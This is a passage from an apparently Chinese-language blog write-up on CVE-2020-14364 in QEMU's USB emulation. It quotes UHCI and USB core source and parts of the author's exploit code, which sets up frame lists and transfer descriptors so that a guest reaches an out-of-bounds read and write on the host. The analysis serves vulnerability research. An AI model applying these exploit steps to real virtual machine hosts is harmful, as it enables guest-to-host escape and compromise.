set_UHCIState();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>set_UHCIState</code>中，第一行<code>pmio_write(0,UHCI_CMD_HCRESET)</code>首先清空UHCI的状态，这样最后一行的<code>pmio_write(0, UHCI_CMD_RS)</code>就可以触发进入<code>uhci_process_frame</code>函数，第二行要先将所有的USB端口状态重置，并且使能。这因为在<code>uhci_handle_td</code>函数中会调用<code>uhci_find_device</code>函数去查找已挂载的USB设备</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">static int uhci_handle_td(UHCIState *s, UHCIQueue *q, uint32_t qh_addr,</span><br><span class="line">                          UHCI_TD *td, uint32_t td_addr, uint32_t *int_mask)</span><br><span class="line">&#123;</span><br><span class="line">...................</span><br><span class="line">   /* Allocate new packet */</span><br><span class="line">    if (q == NULL) &#123;</span><br><span class="line">        USBDevice *dev;</span><br><span class="line">        USBEndpoint *ep;</span><br><span class="line"></span><br><span class="line">        dev = uhci_find_device(s, (td-&gt;token &gt;&gt; 8) &amp; 0x7f);</span><br><span class="line">        if (dev == NULL) &#123;</span><br><span class="line">            return uhci_handle_td_error(s, td, td_addr, USB_RET_NODEV,</span><br><span class="line">                                        int_mask);</span><br><span class="line">        &#125;</span><br><span class="line">        ep = usb_ep_get(dev, pid, (td-&gt;token &gt;&gt; 15) &amp; 0xf);</span><br><span class="line">        q = uhci_queue_new(s, qh_addr, td, ep);</span><br><span class="line">    &#125;</span><br><span class="line">....................</span><br></pre></td></tr></table></figure>
<p>而<code>uhci_find_device</code>函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">static USBDevice *uhci_find_device(UHCIState *s, uint8_t addr)</span><br><span class="line">&#123;</span><br><span class="line">    USBDevice *dev;</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    for (i = 0; i &lt; NB_PORTS; i++) &#123;</span><br><span class="line">        UHCIPort *port = &amp;s-&gt;ports[i];</span><br><span class="line">        if (!(port-&gt;ctrl &amp; UHCI_PORT_EN)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        dev = usb_find_device(&amp;port-&gt;port, addr);</span><br><span class="line">        if (dev != NULL) &#123;</span><br><span class="line">            return dev;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要有<code>UHCI_PORT_EN</code>使能标志，否则<code>uhci_find_device</code>将返回NULL。那么返回上一个函数时，将进入<code>uhci_handle_td_error</code>函数<br>uhci_handle_td_error函数如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">static int uhci_handle_td_error(UHCIState *s, UHCI_TD *td, uint32_t td_addr,</span><br><span class="line">                                int status, uint32_t *int_mask)</span><br><span class="line">&#123;</span><br><span class="line">.....................</span><br><span class="line">    td-&gt;ctrl &amp;= ~TD_CTRL_ACTIVE;</span><br><span class="line">    s-&gt;status |= UHCI_STS_USBERR;</span><br><span class="line">    if (td-&gt;ctrl &amp; TD_CTRL_IOC) &#123;</span><br><span class="line">        *int_mask |= 0x01;</span><br><span class="line">    &#125;</span><br><span class="line">    uhci_update_irq(s);</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数会将<code>td-&gt;ctrl</code>中的<code>TD_CTRL_ACTIVE</code>标志清除掉，并且在返回到<code>uhci_process_frame</code>函数时，由于<code>td-&gt;ctrl</code>发生变化，将会通过<code>DMA</code>的方式将变化后的内容重新写回到我们传入到数据中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">static void uhci_process_frame(UHCIState *s)</span><br><span class="line">&#123;</span><br><span class="line">...............</span><br><span class="line">        old_td_ctrl = td.ctrl;</span><br><span class="line">        ret = uhci_handle_td(s, NULL, curr_qh, &amp;td, link, &amp;int_mask);</span><br><span class="line">        if (old_td_ctrl != td.ctrl) &#123;</span><br><span class="line">            /* update the status bits of the TD */</span><br><span class="line">            val = cpu_to_le32(td.ctrl);</span><br><span class="line">            pci_dma_write(&amp;s-&gt;dev, (link &amp; ~0xf) + 4, &amp;val, sizeof(val));</span><br><span class="line">        &#125;</span><br><span class="line">..............</span><br></pre></td></tr></table></figure>

<p>这将导致下一次进入<code>uhci_handle_td</code>函数时，不满足条件而直接返回。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static int uhci_handle_td(UHCIState *s, UHCIQueue *q, uint32_t qh_addr,</span><br><span class="line">                          UHCI_TD *td, uint32_t td_addr, uint32_t *int_mask)</span><br><span class="line">&#123;</span><br><span class="line">..........</span><br><span class="line">    /* Is active ? */</span><br><span class="line">    if (!(td-&gt;ctrl &amp; TD_CTRL_ACTIVE)) &#123;</span><br><span class="line">        if (async) &#123;</span><br><span class="line">            /* Guest marked a pending td non-active, cancel the queue */</span><br><span class="line">            uhci_queue_free(async-&gt;queue, &quot;pending td non-active&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        /*</span><br><span class="line">         * ehci11d spec page 22: &quot;Even if the Active bit in the TD is already</span><br><span class="line">         * cleared when the TD is fetched ... an IOC interrupt is generated&quot;</span><br><span class="line">         */</span><br><span class="line">        if (td-&gt;ctrl &amp; TD_CTRL_IOC) &#123;</span><br><span class="line">                *int_mask |= 0x01;</span><br><span class="line">        &#125;</span><br><span class="line">        return TD_RESULT_NEXT_QH;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>因此USB端口的初始化是必要的。接下来，由于<code>frame_addr = s-&gt;fl_base_addr + ((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2);</code>，因此<code>s-&gt;fl_base_addr</code>必须设置，而<code>s-&gt;frnum</code>是一个递增的变量，代表当前的<code>frame</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">static void uhci_frame_timer(void *opaque)</span><br><span class="line">&#123;</span><br><span class="line">.............</span><br><span class="line">    for (i = 0; i &lt; frames; i++) &#123;</span><br><span class="line">        s-&gt;frame_bytes = 0;</span><br><span class="line">        trace_usb_uhci_frame_start(s-&gt;frnum);</span><br><span class="line">        uhci_async_validate_begin(s);</span><br><span class="line">        uhci_process_frame(s);</span><br><span class="line">        uhci_async_validate_end(s);</span><br><span class="line">        /* The spec says frnum is the frame currently being processed, and</span><br><span class="line">         * the guest must look at frnum - 1 on interrupt, so inc frnum now */</span><br><span class="line">        s-&gt;frnum = (s-&gt;frnum + 1) &amp; 0x7ff;</span><br><span class="line">        s-&gt;expire_time += frame_t;</span><br><span class="line">    &#125;</span><br><span class="line">...........</span><br><span class="line">&#125;</span><br><span class="line">static void uhci_process_frame(UHCIState *s)</span><br><span class="line">&#123;</span><br><span class="line">    uint32_t frame_addr, link, old_td_ctrl, val, int_mask;</span><br><span class="line">    uint32_t curr_qh, td_count = 0;</span><br><span class="line">    int cnt, ret;</span><br><span class="line">    UHCI_TD td;</span><br><span class="line">    UHCI_QH qh;</span><br><span class="line">    QhDb qhdb;</span><br><span class="line"></span><br><span class="line">    frame_addr = s-&gt;fl_base_addr + ((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2);</span><br><span class="line">    pci_dma_read(&amp;s-&gt;dev, frame_addr, &amp;link, 4);</span><br><span class="line">....................</span><br><span class="line">        /* TD */</span><br><span class="line">        uhci_read_td(s, &amp;td, link);</span><br><span class="line">        trace_usb_uhci_td_load(curr_qh &amp; ~0xf, link &amp; ~0xf, td.ctrl, td.token);</span><br><span class="line"></span><br><span class="line">        old_td_ctrl = td.ctrl;</span><br><span class="line">        ret = uhci_handle_td(s, NULL, curr_qh, &amp;td, link, &amp;int_mask);</span><br><span class="line">.............</span><br></pre></td></tr></table></figure>
<p>且<code>s-&gt;frnum</code>的值是从0到0x7ff递增的，只要我们在任何一个s-&gt;frnum对应的位置即<code>frame_addr = s-&gt;fl_base_addr + ((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2)</code>处布置下一个数据，这个数据将被读入到link变量中<code>pci_dma_read(&amp;s-&gt;dev, frame_addr, &amp;link, 4)</code>。在这里我们选择了<code>dmabuf + 0x100</code>的位置，同时<code>s-&gt;fl_base_addr</code>也设置为了<code>td</code>的物理地址。并且由于我们的td就位于dmabuf的开头</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">td_phy_addr_in_any_frame = (uint32_t *)(dmabuf + 0x100);</span><br><span class="line">uint32_t td_phy_addr = get_phys_addr(td);</span><br><span class="line">*td_phy_addr_in_any_frame = td_phy_addr;</span><br><span class="line">pmio_write(8, td_phy_addr); //设置s-&gt;fl_base_addr为td结构体的物理地址</span><br></pre></td></tr></table></figure>
<p>那么当<code>((s-&gt;frnum &amp; 0x3ff) &lt;&lt; 2 == 0x100</code>，即0x40时，<code>pci_dma_read(&amp;s-&gt;dev, frame_addr, &amp;link, 4)</code>读取到的就是<code>dmabuf + 0x100</code>，即读取到了td的物理地址。于是<code>uhci_read_td(s, &amp;td, link);</code>从这个物理地址处取出出了td的结构体，然后传递给<code>uhci_handle_td</code>进行处理。</p>
<h2 id="0x04-USB数据包处理漏洞（CVE-2020-14364）"><a href="#0x04-USB数据包处理漏洞（CVE-2020-14364）" class="headerlink" title="0x04 USB数据包处理漏洞（CVE-2020-14364）"></a>0x04 USB数据包处理漏洞（CVE-2020-14364）</h2><p>在上述的操作后，我们只需要设置好td结构体里对应的内容，就可以进行USB的读写操作了。usb_handle_packet函数处理一个USB数据包，位于源文件<code>hw/usb/core.c</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">/* Hand over a packet to a device for processing.  p-&gt;status ==</span><br><span class="line">   USB_RET_ASYNC indicates the processing isn&#x27;t finished yet, the</span><br><span class="line">   driver will call usb_packet_complete() when done processing it. */</span><br><span class="line">void usb_handle_packet(USBDevice *dev, USBPacket *p)</span><br><span class="line">&#123;</span><br><span class="line">    if (dev == NULL) &#123;</span><br><span class="line">        p-&gt;status = USB_RET_NODEV;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    assert(dev == p-&gt;ep-&gt;dev);</span><br><span class="line">    assert(dev-&gt;state == USB_STATE_DEFAULT);</span><br><span class="line">    usb_packet_check_state(p, USB_PACKET_SETUP);</span><br><span class="line">    assert(p-&gt;ep != NULL);</span><br><span class="line"></span><br><span class="line">    /* Submitting a new packet clears halt */</span><br><span class="line">    if (p-&gt;ep-&gt;halted) &#123;</span><br><span class="line">        assert(QTAILQ_EMPTY(&amp;p-&gt;ep-&gt;queue));</span><br><span class="line">        p-&gt;ep-&gt;halted = false;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (QTAILQ_EMPTY(&amp;p-&gt;ep-&gt;queue) || p-&gt;ep-&gt;pipeline || p-&gt;stream) &#123;</span><br><span class="line">        usb_process_one(p);</span><br><span class="line">        if (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">            /* hcd drivers cannot handle async for isoc */</span><br><span class="line">            assert(p-&gt;ep-&gt;type != USB_ENDPOINT_XFER_ISOC);</span><br><span class="line">            /* using async for interrupt packets breaks migration */</span><br><span class="line">            assert(p-&gt;ep-&gt;type != USB_ENDPOINT_XFER_INT ||</span><br><span class="line">                   (dev-&gt;flags &amp; (1 &lt;&lt; USB_DEV_FLAG_IS_HOST)));</span><br><span class="line">            usb_packet_set_state(p, USB_PACKET_ASYNC);</span><br><span class="line">            QTAILQ_INSERT_TAIL(&amp;p-&gt;ep-&gt;queue, p, queue);</span><br><span class="line">        &#125; else if (p-&gt;status == USB_RET_ADD_TO_QUEUE) &#123;</span><br><span class="line">            usb_queue_one(p);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            /*</span><br><span class="line">             * When pipelining is enabled usb-devices must always return async,</span><br><span class="line">             * otherwise packets can complete out of order!</span><br><span class="line">             */</span><br><span class="line">            assert(p-&gt;stream || !p-&gt;ep-&gt;pipeline ||</span><br><span class="line">                   QTAILQ_EMPTY(&amp;p-&gt;ep-&gt;queue));</span><br><span class="line">            if (p-&gt;status != USB_RET_NAK) &#123;</span><br><span class="line">                usb_pcap_data(p, false);</span><br><span class="line">                usb_packet_set_state(p, USB_PACKET_COMPLETE);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        usb_queue_one(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其主要调用了<code>usb_process_one</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">static void usb_process_one(USBPacket *p)</span><br><span class="line">&#123;</span><br><span class="line">    USBDevice *dev = p-&gt;ep-&gt;dev;</span><br><span class="line">    bool nak;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     * Handlers expect status to be initialized to USB_RET_SUCCESS, but it</span><br><span class="line">     * can be USB_RET_NAK here from a previous usb_process_one() call,</span><br><span class="line">     * or USB_RET_ASYNC from going through usb_queue_one().</span><br><span class="line">     */</span><br><span class="line">    nak = (p-&gt;status == USB_RET_NAK);</span><br><span class="line">    p-&gt;status = USB_RET_SUCCESS;</span><br><span class="line"></span><br><span class="line">    if (p-&gt;ep-&gt;nr == 0) &#123;</span><br><span class="line">        /* control pipe */</span><br><span class="line">        if (p-&gt;parameter) &#123;</span><br><span class="line">            do_parameter(dev, p);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        switch (p-&gt;pid) &#123;</span><br><span class="line">        case USB_TOKEN_SETUP:</span><br><span class="line">            do_token_setup(dev, p);</span><br><span class="line">            break;</span><br><span class="line">        case USB_TOKEN_IN:</span><br><span class="line">            do_token_in(dev, p);</span><br><span class="line">            break;</span><br><span class="line">        case USB_TOKEN_OUT:</span><br><span class="line">            do_token_out(dev, p);</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            p-&gt;status = USB_RET_STALL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        /* data pipe */</span><br><span class="line">        if (!nak) &#123;</span><br><span class="line">            usb_pcap_data(p, true);</span><br><span class="line">        &#125;</span><br><span class="line">        usb_device_handle_data(dev, p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中注意到<code>do_token_setup</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">static void do_token_setup(USBDevice *s, USBPacket *p)</span><br><span class="line">&#123;</span><br><span class="line">    int request, value, index;</span><br><span class="line"></span><br><span class="line">    if (p-&gt;iov.size != 8) &#123;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    usb_packet_copy(p, s-&gt;setup_buf, p-&gt;iov.size);</span><br><span class="line">    s-&gt;setup_index = 0;</span><br><span class="line">    p-&gt;actual_length = 0;</span><br><span class="line">    s-&gt;setup_len   = (s-&gt;setup_buf[7] &lt;&lt; 8) | s-&gt;setup_buf[6];</span><br><span class="line">    if (s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)) &#123;</span><br><span class="line">        fprintf(stderr,</span><br><span class="line">                &quot;usb_generic_handle_packet: ctrl buffer too small (%d &gt; %zu)\n&quot;,</span><br><span class="line">                s-&gt;setup_len, sizeof(s-&gt;data_buf));</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">..............</span><br></pre></td></tr></table></figure>
<p>在检查出<code>s-&gt;setup_len &gt; sizeof(s-&gt;data_buf)</code>时，虽然报错并且返回，当并没有将<code>s-&gt;setup_len</code>的值给清除，只要不对USB端口进行重置，这个值将一直保留，那么，这个<code>s-&gt;setup_len</code>我们是可以控制为任意大小的。<br>那么在<code>do_token_in</code>函数进行数据读取时，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">static void do_token_in(USBDevice *s, USBPacket *p)</span><br><span class="line">&#123;</span><br><span class="line">    int request, value, index;</span><br><span class="line"></span><br><span class="line">    assert(p-&gt;ep-&gt;nr == 0);</span><br><span class="line"></span><br><span class="line">    request = (s-&gt;setup_buf[0] &lt;&lt; 8) | s-&gt;setup_buf[1];</span><br><span class="line">    value   = (s-&gt;setup_buf[3] &lt;&lt; 8) | s-&gt;setup_buf[2];</span><br><span class="line">    index   = (s-&gt;setup_buf[5] &lt;&lt; 8) | s-&gt;setup_buf[4];</span><br><span class="line"></span><br><span class="line">    switch(s-&gt;setup_state) &#123;</span><br><span class="line">    case SETUP_STATE_ACK:</span><br><span class="line">        if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            usb_device_handle_control(s, p, request, value, index,</span><br><span class="line">                                      s-&gt;setup_len, s-&gt;data_buf);</span><br><span class="line">            if (p-&gt;status == USB_RET_ASYNC) &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            p-&gt;actual_length = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case SETUP_STATE_DATA:</span><br><span class="line">        if (s-&gt;setup_buf[0] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            int len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">            if (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    default:</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中看到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s-&gt;setup_index += len;</span><br><span class="line">if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">    s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每一次<code>s-&gt;setup_index</code>累加上len，然后判断<code>s-&gt;setup_index</code>是否超过<code>s-&gt;setup_len</code>，由于<code>s-&gt;setup_len</code>可以被我们控制，因此<code>s-&gt;setup_index</code>也可以被我们控制。那么<code>usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</code>便可以进行越界读取，同理在<code>do_token_out</code>函数中进行写数据时，可以越界写。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">static void do_token_out(USBDevice *s, USBPacket *p)</span><br><span class="line">&#123;</span><br><span class="line">    assert(p-&gt;ep-&gt;nr == 0);</span><br><span class="line"></span><br><span class="line">    switch(s-&gt;setup_state) &#123;</span><br><span class="line">    case SETUP_STATE_ACK:</span><br><span class="line">        if (s-&gt;setup_buf[0] &amp; USB_DIR_IN) &#123;</span><br><span class="line">            s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">            /* transfer OK */</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            /* ignore additional output */</span><br><span class="line">        &#125;</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">    case SETUP_STATE_DATA:</span><br><span class="line">        if (!(s-&gt;setup_buf[0] &amp; USB_DIR_IN)) &#123;</span><br><span class="line">            int len = s-&gt;setup_len - s-&gt;setup_index;</span><br><span class="line">            if (len &gt; p-&gt;iov.size) &#123;</span><br><span class="line">                len = p-&gt;iov.size;</span><br><span class="line">            &#125;</span><br><span class="line">            usb_packet_copy(p, s-&gt;data_buf + s-&gt;setup_index, len);</span><br><span class="line">            s-&gt;setup_index += len;</span><br><span class="line">            if (s-&gt;setup_index &gt;= s-&gt;setup_len) &#123;</span><br><span class="line">                s-&gt;setup_state = SETUP_STATE_ACK;</span><br><span class="line">            &#125;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        s-&gt;setup_state = SETUP_STATE_IDLE;</span><br><span class="line">        p-&gt;status = USB_RET_STALL;</span><br><span class="line">        break;</span><br><span class="line">..........................</span><br></pre></td></tr></table></figure>
<p>这就是<code>CVE-2020-14364</code><br>其中len是有范围的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">static int uhci_handle_td(UHCIState *s, UHCIQueue *q, uint32_t qh_addr,</span><br><span class="line">                          UHCI_TD *td, uint32_t td_addr, uint32_t *int_mask)</span><br><span class="line">&#123;</span><br><span class="line">..............</span><br><span class="line">   max_len = ((td-&gt;token &gt;&gt; 21) + 1) &amp; 0x7ff;</span><br><span class="line">    spd = (pid == USB_TOKEN_IN &amp;&amp; (td-&gt;ctrl &amp; TD_CTRL_SPD) != 0);</span><br><span class="line">    usb_packet_setup(&amp;async-&gt;packet, pid, q-&gt;ep, 0, td_addr, spd,</span><br><span class="line">                     (td-&gt;ctrl &amp; TD_CTRL_IOC) != 0);</span><br><span class="line">    if (max_len &lt;= sizeof(async-&gt;static_buf)) &#123;</span><br><span class="line">        async-&gt;buf = async-&gt;static_buf;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        async-&gt;buf = g_malloc(max_len);</span><br><span class="line">    &#125;</span><br><span class="line">    usb_packet_addbuf(&amp;async-&gt;packet, async-&gt;buf, max_len);</span><br><span class="line"></span><br><span class="line">    switch(pid) &#123;</span><br><span class="line">    case USB_TOKEN_OUT:</span><br><span class="line">    case USB_TOKEN_SETUP:</span><br><span class="line">        pci_dma_read(&amp;s-&gt;dev, td-&gt;buffer, async-&gt;buf, max_len);</span><br><span class="line">        